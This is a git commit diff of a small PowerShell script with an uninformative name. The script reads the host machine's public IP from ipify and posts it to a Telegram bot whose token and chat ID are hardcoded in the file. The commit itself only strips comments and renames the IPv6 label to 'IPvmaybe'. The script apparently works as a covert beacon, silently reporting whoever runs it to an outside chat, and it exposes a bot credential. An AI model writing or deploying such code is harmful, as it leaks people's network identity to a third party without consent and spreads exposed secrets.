4c6ed5f30b157467c835bc9d413393735fdf4ccf
NeroMaster1 <neroonline666@gmail.com>
2026-01-29 14:54:02 -0500

    Update nothingmaster111111111.ps1

--- nothingmaster111111111.ps1
+++ nothingmaster111111111.ps1
@@ -1,26 +1,17 @@
-# === CONFIG ===
 $token   = "8279576875:AAGCH5LvylPPaUReAB9kcyZELGGTL9JZ5LU"
 $chat_id = "8278886318"
-
-# === GET PUBLIC IP ===
 try {
-    # Try IPv6 first
     $ip = Invoke-RestMethod -Uri "https://api64.ipify.org"
-    $ipType = "IPv6"
+    $ipType = "IPvmaybe"
 }
 catch {
-    # Fallback to IPv4
     $ip = Invoke-RestMethod -Uri "https://api.ipify.org"
     $ipType = "IPv4"
 }
-
-# === MESSAGE ===
 $payload = @{
     chat_id = $chat_id
     text    = "Public IP ($ipType): $ip"
 }
-
-# === SEND TO TELEGRAM ===
 Invoke-RestMethod `
     -Uri "https://api.telegram.org/bot$token/sendMessage" `
     -Method Post `
